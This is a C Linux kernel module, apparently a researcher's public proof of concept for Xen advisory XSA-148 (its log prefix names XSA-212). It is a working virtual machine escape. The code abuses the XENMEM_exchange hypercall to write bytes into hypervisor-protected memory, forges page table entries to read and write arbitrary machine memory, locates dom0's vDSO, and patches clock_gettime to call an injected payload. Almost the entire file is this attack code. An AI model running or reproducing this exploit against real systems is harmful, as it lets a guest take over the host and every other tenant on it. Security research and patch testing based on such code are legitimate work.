#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/gfp.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <asm/xen/hypercall.h>
#include <asm/xen/page.h>

#include "payload.h"

#define MAX_MFN 0x7FFFFF
#define PMD_FLAG (_PAGE_RW | _PAGE_USER | _PAGE_ACCESSED | _PAGE_DIRTY | _PAGE_PRESENT)
#define PTE_FLAG PMD_FLAG
#define PADDR_BITS 44
#define PADDR_MASK ((1ULL << PADDR_BITS)-1)
#define pg_entry(__pgd, i) ((__pgd) + i)
#define pgd_to_mfn(__pgd) ((__pgd->pgd & (PAGE_MASK & PADDR_MASK)) >> PAGE_SHIFT)
#define pud_to_mfn(__pud) ((__pud->pud & (PAGE_MASK & PADDR_MASK)) >> PAGE_SHIFT)
#define pmd_to_mfn(__pmd) ((__pmd->pmd & (PAGE_MASK & PADDR_MASK)) >> PAGE_SHIFT)
#define pte_to_mfn(__pte) ((__pte->pte & (PAGE_MASK & PADDR_MASK)) >> PAGE_SHIFT)
#define no_reserved_bits(x) ((x & (1<<7)) | ( (x>>43) & 127))

#define FIND_START_INFO_PAGE 1
#define FIND_VDSO_PAGE 2
#define DO_PAGE_READ 1
#define DO_PAGE_WRITE 2

#define XENMEM_exchange 11UL
#define VOID_PTE (mfn_pte(0, __pgprot(0)))

static char str_buf[1024];

#define HLOG(_str,_a...)\
    sprintf(str_buf,"xsa212_remove_privec-%d:" _str "\n", __LINE__, ## _a); \
    HYPERVISOR_console_io(CONSOLEIO_write,strlen(str_buf),str_buf); 

#define slow_print(...) ({pr_emerg(__VA_ARGS__); schedule_timeout_uninterruptible(2);})

#define logvar(_v,_f,_a...) \
        slow_print(#_v "\t" _f "\n",_v); 


#define DEBUG(_f, _a...) \
	printk("xen_exploit:%d - " _f "\n", __LINE__, ## _a);

#define __mfn(_v) ((unsigned long) (arbitrary_virt_to_machine(_v).maddr >> PAGE_SHIFT))
#define __machine_addr(_v) ((unsigned long) arbitrary_virt_to_machine(_v).maddr)

#define HYPERVISOR_tlb_flush_all() { \
	struct mmuext_op uops[] = {{.cmd =  MMUEXT_TLB_FLUSH_ALL}}; \
	HYPERVISOR_mmuext_op(uops, 1, NULL, DOMID_SELF); }

static void* l2_entry_va;
// backup pte value to be restored after each use
static unsigned long stub_pte;

void page_walk(unsigned long va)
{
	pgd_t *pgd;
	pud_t *pud;
	pmd_t *pmd;
	pte_t *pte;
	struct mm_struct *mm = current->mm;

	pgd = pgd_offset(mm, va);
	pud = pud_offset(pgd, va);
	pmd = pmd_offset(pud, va);
	pte = pte_offset_kernel(pmd, va);
	printk("PGD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s)\n", pgd, __machine_addr(pgd), *(unsigned long*) pgd, pgd_index(va), (pgd_present(*pgd)) ? "P" : "");
	printk("PUD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s)\n", pud, __machine_addr(pud), *(unsigned long*) pud, pud_index(va), (pud_present(*pud)) ? "P" : "");
	printk("PMD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s %s)\n", pmd, __machine_addr(pmd), *(unsigned long*) pmd, pmd_index(va), (pmd_present(*pmd)) ? "P" : "", (pmd_large(*pmd)) ? "PSE" : "");
	printk("PTE (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s %s)\n", pte, __machine_addr(pte), *(unsigned long*) pte, pte_index(va), (pte_present(*pte)) ? "P" : "", (pte_write(*pte)) ? "RW" : "");
}

pgd_t *get_pgd(unsigned long va)
{
	struct mm_struct *mm = current->mm;
	return pgd_offset(mm, va);
}

pud_t *get_pud(unsigned long va)
{
	return pud_offset(get_pgd(va), va);
}

pmd_t *get_pmd(unsigned long va)
{
	return pmd_offset(get_pud(va), va);
}

pte_t *get_pte(unsigned long va)
{
	return pte_offset_kernel(get_pmd(va), va);
}

int mmu_update(unsigned long ptr, unsigned long val)
{
	struct mmu_update mmu_updates;
	int rc;

	mmu_updates.ptr = ptr;
	mmu_updates.val = val;
	rc = HYPERVISOR_mmu_update(&mmu_updates, 1, NULL, DOMID_SELF);
	HYPERVISOR_tlb_flush_all();

	return rc;
}

int startup_dump(unsigned long l2_entry_va, unsigned long aligned_mfn_va)
{
	pte_t *pte_aligned = get_pte(aligned_mfn_va);
	pmd_t *pmd = get_pmd(l2_entry_va);
	int rc;

	// removes RW bit on the aligned_mfn_va's pte
	rc = mmu_update(__machine_addr(pte_aligned) | MMU_NORMAL_PT_UPDATE, pte_aligned->pte & ~_PAGE_RW);
	if(rc < 0)
	{
		printk("cannot unset RW flag on PTE (0x%lx)\n", aligned_mfn_va);
		return -1;
	}

	// map.
    stub_pte = (__mfn((void*) aligned_mfn_va) << PAGE_SHIFT) | PTE_FLAG;
	rc = mmu_update(__machine_addr(pmd) | MMU_NORMAL_PT_UPDATE, stub_pte);
	if(rc < 0)
	{
		printk("cannot update L2 entry 0x%lx\n", l2_entry_va);
		return -1;
	}

	return 0;
}


struct xen_memory_reservation {
    u64 extent_start;
    u64 nr_extents;
    u32 extent_order;
    u32 address_bits;
    u16 domid;
};

struct xen_memory_exchange {
    struct xen_memory_reservation in;
    struct xen_memory_reservation out;
    u64 nr_exchanged;
};


static int dealloc_with_last_byte(u8 val) {
  void *victim_page_virt;
  u64 in_extent;
  u64 out_extent;
  int ret;
  struct xen_memory_exchange args;
  while (1) {
    // Find a physical page whose MFN ends with the value we want.
    // Leak everything else.
    victim_page_virt = (void*)__get_free_pages(GFP_KERNEL, 0);
    if (!victim_page_virt) return 1;
    in_extent = virt_to_mfn(victim_page_virt);
    if ((in_extent & 0xff) != val) {
      //slow_print("got 0x%hhx, wanted 0x%hhx  (in_extent=0x%llx)\n", (u8)(in_extent & 0xff), val, in_extent);
      continue;
    }

    // Remove reference to the page.
    HYPERVISOR_update_va_mapping((unsigned long)victim_page_virt, VOID_PTE, 0);

    // Push the page on the domheap by exchanging it for a different one.
    // This calls XENMEM_exchange with legitimate arguments; the bug is triggered
    // in try_write_byte_hyper().
    out_extent = 0; /* this is probably not exactly right */
    args = (struct xen_memory_exchange){
      .in = {
        .extent_start = (u64)&in_extent,
        .nr_extents = 1,
        .domid = DOMID_SELF
      },
      .out = {
        .extent_start = (u64)&out_extent,
        .nr_extents = 1,
        .domid = DOMID_SELF
      }
    };
    ret = HYPERVISOR_memory_op(XENMEM_exchange, &args);
    if (ret != 0) {
      slow_print("exchange in dealloc_with_last_byte() failed with %d\n", ret);
      return ret;
    }
    return 0;
  }
}

/* writes a byte to Xen-enforced readonly physical memory, clobbering the next 7 bytes.
 * may fail silently because of raciness, caller should verify.
 * rval!=0 means stuff went wrong, memory allocation failure or so.
 */
static int try_write_byte_hyper(u8 *dst, u8 val) {
  u64 target_addr = arbitrary_virt_to_machine(dst).maddr + 0xffff830000000000;
  u64 out_extent_base_addr, in_extent, nr_exchanged,
      nr_extents, in_extent_addr, in_extent_base;
  void *victim_page_virt;
  struct xen_memory_exchange args;
  unsigned long ret;

  // hypervisor is lower than kernel, so hypervisor reference has to come first
  out_extent_base_addr = (target_addr & 0x7);

  victim_page_virt = (void*)__get_free_pages(GFP_KERNEL, 0);
  if (!victim_page_virt) return 1;
  in_extent = virt_to_mfn(victim_page_virt);

  // We need to do this to make steal_page() in memory_exchange() work.
  // Equivalent to xen_zap_pfn_range(victim_page_virt, 0, NULL, NULL).
  HYPERVISOR_update_va_mapping((unsigned long)victim_page_virt, VOID_PTE, 0);

  nr_exchanged = (target_addr - out_extent_base_addr) / 8;
  nr_extents = nr_exchanged + 1;
  in_extent_addr = (u64)&in_extent;
  in_extent_base = in_extent_addr - (nr_exchanged * 8);

  if (dealloc_with_last_byte(val))
    return 1;

  args = (struct xen_memory_exchange){
    .in = {
      .extent_start = in_extent_base,
      .nr_extents = nr_extents,
      .domid = DOMID_SELF
    },
    .out = {
      .extent_start = out_extent_base_addr,
      .nr_extents = nr_extents,
      .domid = DOMID_SELF
    },
    .nr_exchanged = nr_exchanged
  };
  ret = HYPERVISOR_memory_op(XENMEM_exchange, &args);
  if (ret) {
    slow_print("try_write_byte_hyper: hypercall returns 0x%lx\n", ret);
    return ret;
  }
  return 0;
}

static int write_byte_hyper(u8 *dst, u8 val) {
  slow_print("write_byte_hyper(%p, 0x%hhx)\n", dst, val);
  while (READ_ONCE(*dst) != val) {
    if (try_write_byte_hyper(dst, val))
      return 1;
  }
  slow_print("write_byte_hyper successful\n");
  return 0;
}

/*
 * Writes a PTE that references a Page Table.
 * Exploits the bug to create a reference to a Page Directory we fully control.
 * 1GB of memory is mapped through the Page Directory.
 */
static int set_pte_entry(pte_t *pte, u64 pg_phys_addr) {
  int i;

  /* data we want to write */
  u8 crafted_pte_entry[] = {
    /* flags of phys mapping:
     * present=1, write=1, user=1, pwt=0, pcd=0, a=0, d=0, ps=0
     * (including phys address zero)
     */
    0x07, 0, 0, 0, 0, 0, 0, 0,
    /* flags of adjacent mapping: present=0 (plus trailing garbage that's invisible here).
     * This is necessary because otherwise, trailing garbage from the first entry might
     * set the present bit for this entry. */
    0
  };
  *(uint64_t*)crafted_pte_entry |= pg_phys_addr;

  slow_print("### trying to write crafted PTE entry...\n");
  for (i = 0; i < sizeof(crafted_pte_entry); i++) {
    slow_print("### writing byte %d\n", i);
    if (write_byte_hyper(((u8*)pte) + i, crafted_pte_entry[i])) {
      slow_print("### write_byte_hyper failed!\n");
      return 1;
    }
  }
  slow_print("### crafted PTE entry written\n");
  return 0;
}

void do_page_buff(unsigned long mfn, char *buff, int what)
{
    mfn = (mfn << PAGE_SHIFT) | PTE_FLAG;
    logvar(mfn,"%lx with flags");
    //logvar(*((unsigned long *)mfn),"%lx");
    HLOG("Will set the page to the target mfn %lx",mfn);
    set_pte_entry(get_pte((unsigned long)l2_entry_va), mfn);
    barrier();

	if(what == DO_PAGE_READ)
	{
		memcpy(buff, l2_entry_va, PAGE_SIZE);
	}
	else if (what == DO_PAGE_WRITE)
	{
		memcpy(l2_entry_va, buff, PAGE_SIZE);
	}

	// restore the default address
    set_pte_entry(get_pte((unsigned long)l2_entry_va), stub_pte);
}

void dump_page_buff(unsigned long mfn, char *buff)
{
	do_page_buff(mfn, buff, DO_PAGE_READ);
}

void write_page_buff(unsigned long mfn, char *buff)
{
	do_page_buff(mfn, buff, DO_PAGE_WRITE);
}

void *memmem(const void *l, size_t l_len, const void *s, size_t s_len)
{
	register char *cur, *last;
	const char *cl = (const char *)l;
	const char *cs = (const char *)s;

	/* we need something to compare */
	if (l_len == 0 || s_len == 0)
		return NULL;

	/* "s" must be smaller or equal to "l" */
	if (l_len < s_len)
		return NULL;

	/* special case where s_len == 1 */
	if (s_len == 1)
		return memchr(l, (int)*cs, l_len);

	/* the last position where its possible to find "s" in "l" */
	last = (char *)cl + l_len - s_len;

	for (cur = (char *)cl; cur <= last; cur++)
		if (cur[0] == cs[0] && memcmp(cur, cs, s_len) == 0)
			return cur;

	return NULL;
}


int is_startup_info_page(char *page_data)
{
	int ret = 0;
	char marker[] = "xen-3.0-x86_64p";

	if(memcmp(page_data, marker, sizeof(marker)-1) == 0)
	{
		ret = 1;
	}

	return ret;
}

int is_vdso_page(char *page_data)
{
	char elf_header[] = "\x7f\x45\x4c\x46\x02\x01\x01\x00";
	char vdso_marker[] = "vdso_gettimeofday";
	int ret = 0;

	if(!memcmp(page_data, elf_header, sizeof(elf_header)) &&
		memmem(page_data, PAGE_SIZE, vdso_marker, sizeof(vdso_marker)) != NULL)
	{
		ret = 1;
	}

	return ret;
}

void patch_vdso(unsigned long vdso_mfn)
{
	char *vdso_data = kmalloc(PAGE_SIZE*2, GFP_KERNEL);
	unsigned long entry_point;
	unsigned int value;
	unsigned long clock_gettime_offset;

	dump_page_buff(vdso_mfn, vdso_data);
	dump_page_buff(vdso_mfn+1, vdso_data+PAGE_SIZE);

	/* e_entry */
	entry_point = *(unsigned long*) (vdso_data + 0x18);
	clock_gettime_offset = entry_point & 0xfff;

	/* put payload at the end of vdso */
	memcpy(vdso_data+PAGE_SIZE*2-payload_o_len, payload_o, payload_o_len);

	//  hijack clock_gettime
	value = PAGE_SIZE*2 - payload_o_len - clock_gettime_offset;
	vdso_data[clock_gettime_offset] = '\x90'; // nop
	vdso_data[clock_gettime_offset+1] = '\xe8'; // call
	*(unsigned int*)(vdso_data+clock_gettime_offset+2) = value - 6;

	// write modified vdso
	write_page_buff(vdso_mfn, vdso_data);
	write_page_buff(vdso_mfn+1, vdso_data+PAGE_SIZE);
}


int find_in_pte(pte_t *pte_base, int what)
{
	int i;
	pte_t *curr_pte;
	unsigned long curr_pte_val;
	unsigned int data_mfn;
	char *data = kmalloc(PAGE_SIZE, GFP_KERNEL);
	int ret = 0;

	for(i=0; i<512; i++)
	{
		curr_pte = pg_entry(pte_base, i);
		curr_pte_val = curr_pte->pte;
		data_mfn = pte_to_mfn(curr_pte);

		if((curr_pte_val & _PAGE_PRESENT) &&
		   (curr_pte_val & _PAGE_ACCESSED) &&
		   !(curr_pte_val & _PAGE_PSE) &&
		   !no_reserved_bits(curr_pte_val) &&
		   data_mfn != 0 &&
		   data_mfn <= MAX_MFN)
		{
			dump_page_buff(data_mfn, data);

			if(what == FIND_START_INFO_PAGE && is_startup_info_page(data))
			{
				ret = data_mfn;
				break;
			}

			if(what == FIND_VDSO_PAGE && is_vdso_page(data))
			{
				ret = data_mfn;
				break;
			}

		}
	}

	kfree(data);
	return ret;
}

int find_in_pmd(pmd_t *pmd_base, int what)
{
	int i;
	pmd_t *curr_pmd;
	unsigned long curr_pmd_val;
	unsigned int pte_mfn;
	char *pte_data = kmalloc(PAGE_SIZE, GFP_KERNEL);
	int ret = 0;

	for(i=0; i<512; i++)
	{
		curr_pmd = pg_entry(pmd_base, i);
		curr_pmd_val = curr_pmd->pmd;
		pte_mfn = pmd_to_mfn(curr_pmd);

		if((curr_pmd_val & _PAGE_PRESENT) &&
		   (curr_pmd_val & _PAGE_ACCESSED) &&
		   !(curr_pmd_val & _PAGE_PSE) &&
		   !no_reserved_bits(curr_pmd_val) &&
		   pte_mfn != 0 &&
		   pte_mfn <= MAX_MFN)
		{
			dump_page_buff(pte_mfn, pte_data);
			ret = find_in_pte((pte_t*) pte_data, what);
			if(ret != 0)
			{
				break;
			}
		}
	}

	kfree(pte_data);
	return ret;
}

int find_in_pud(pud_t *pud_base, int what)
{
	int i;
	pud_t *curr_pud;
	unsigned long curr_pud_val;
	unsigned int pmd_mfn;
	char *pmd_data = kmalloc(PAGE_SIZE, GFP_KERNEL);
	int ret = 0;

	for(i=0; i<512; i++)
	{
		curr_pud = pg_entry(pud_base, i);
		curr_pud_val = curr_pud->pud;
		pmd_mfn = pud_to_mfn(curr_pud);

		if((curr_pud_val & _PAGE_PRESENT) &&
		   (curr_pud_val & _PAGE_ACCESSED) &&
		   !(curr_pud_val & _PAGE_PSE) &&
		   !no_reserved_bits(curr_pud_val) &&
		   pmd_mfn != 0 &&
		   pmd_mfn <= MAX_MFN)
		{
			// printk("pud : %d, %lx, %lx, %lx\n", i, curr_pud->pud, curr_pud_val, pmd_mfn);
			dump_page_buff(pmd_mfn, pmd_data);
			ret = find_in_pmd((pmd_t*) pmd_data, what);
			if(ret != 0)
			{
				break;
			}
		}
	}

	kfree(pmd_data);
	return ret;
}

int find_in_pgd(pgd_t *pgd_base, int what)
{
	int i;
	pgd_t *curr_pgd;
	unsigned long curr_pgd_val;
	unsigned int pud_mfn;
	char *pud_data = kmalloc(PAGE_SIZE, GFP_KERNEL);
	int ret = 0;

	for(i=0; i<512; i++)
	{
		curr_pgd = pg_entry(pgd_base, i);
		curr_pgd_val = curr_pgd->pgd;
		pud_mfn = pgd_to_mfn(curr_pgd);

		if((curr_pgd_val & _PAGE_PRESENT) &&
		   (curr_pgd_val & _PAGE_ACCESSED) &&
		   !(curr_pgd_val & _PAGE_PSE) &&
		   !no_reserved_bits(curr_pgd_val) &&
		   pud_mfn != 0 &&
		   pud_mfn <= MAX_MFN)
		{
			// printk("pgd : %d, %lx, %lx, %lx\n", i, curr_pgd->pgd, curr_pgd_val, pud_mfn);
			dump_page_buff(pud_mfn, pud_data);
			ret = find_in_pud((pud_t*) pud_data, what);
			if(ret != 0)
			{
				break;
			}
		}
	}

	kfree(pud_data);
	return ret;
}

int find_start_info_into_L4(unsigned long pgd_mfn, pgd_t * pgd)
{
	return find_in_pgd(pgd, FIND_START_INFO_PAGE);
}

int find_vdso_into_L4(unsigned long pgd_mfn, pgd_t * pgd)
{
	return find_in_pgd(pgd, FIND_VDSO_PAGE);
}

static int __init xen_exploit_init(void)
{
	int xen_version = HYPERVISOR_xen_version(0, NULL);
	void* aligned_mfn_va;
	char *buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
	//unsigned long *current_tab = (unsigned long*) buff;
	struct start_info *start_f = (struct start_info *) buff;
	unsigned long page;
    /*  
     *  task_struct get_current => current 
     *  This is a pointer to the current process (which called the process) 
     */
	//unsigned long *my_pgd = (unsigned long*) (current->mm->pgd);
	int tmp;

	DEBUG("xen_version = %d.%d", (xen_version >> 16) & 0xFFFF, xen_version & 0xFFFF);

	// get an aligned mfn
    // get free pages 9 -> blocks of 2^9 pages = 2^9 x 2^12 = 2MB
	aligned_mfn_va = (void*) __get_free_pages(__GFP_ZERO, 9);
	DEBUG("aligned_mfn_va = %p", aligned_mfn_va);
	DEBUG("aligned_mfn_va mfn = 0x%lx", __machine_addr(aligned_mfn_va));
	//page_walk((unsigned long) aligned_mfn_va);

	// get a 2Mb virtual memory
	l2_entry_va = (void*) __get_free_pages(__GFP_ZERO, 9);
	DEBUG("l2_entry_va = %p", l2_entry_va);
	DEBUG("l2_entry_va mfn = 0x%lx", __machine_addr(l2_entry_va));
	//page_walk((unsigned long) l2_entry_va);

	if(startup_dump((unsigned long) l2_entry_va, (unsigned long) aligned_mfn_va))
	{
		DEBUG("unable to map PMD.");
		return -1;
	}

	DEBUG("startup_dump ok");
	page_walk((unsigned long) l2_entry_va);
	page_walk((unsigned long) aligned_mfn_va);


	//for(page=0; page<MAX_MFN; page++)
	for(page=0x212bc0; page<0x212bc2; page++)
	//for(page=0x212bc0; page<0x212bcf; page++)
	{
		dump_page_buff(page, buff);
        /*
        print_if_clause(current_tab, my_pgd, page);
		if(current_tab[261] == my_pgd[261] &&
		   current_tab[262] == my_pgd[262] &&
		   current_tab[511] != 0 &&
		   current_tab[510] != 0 &&
		   __mfn(my_pgd) != page)
        */
        if(1)
		{
			tmp = find_start_info_into_L4(page, (pgd_t*) buff);
			if(tmp != 0)
			{
				// we find a valid start_info page
				DEBUG("start_info page : 0x%x", tmp);
				dump_page_buff(tmp, buff);

				if(start_f->flags & SIF_INITDOMAIN)
				{
					DEBUG("dom0!");
					dump_page_buff(page, buff);
					tmp = find_vdso_into_L4(page, (pgd_t*) buff);

					if(tmp != 0)
					{
                        DEBUG("dom0 vdso : 0x%x", tmp);
						HLOG("dom0 vdso : 0x%x", tmp);
						patch_vdso(tmp);
						DEBUG("patch.");
						HLOG("patch.");
						break;
					}
				} else {
					DEBUG("not dom0");
				}
			}
		}
	}

	return 0;
}

static void __exit xen_exploit_exit(void)
{
	printk("goodbye!\n");
}

module_init(xen_exploit_init);
module_exit(xen_exploit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Jérémie Boutoille - Quarkslab");
MODULE_DESCRIPTION("XSA-148 exploit");
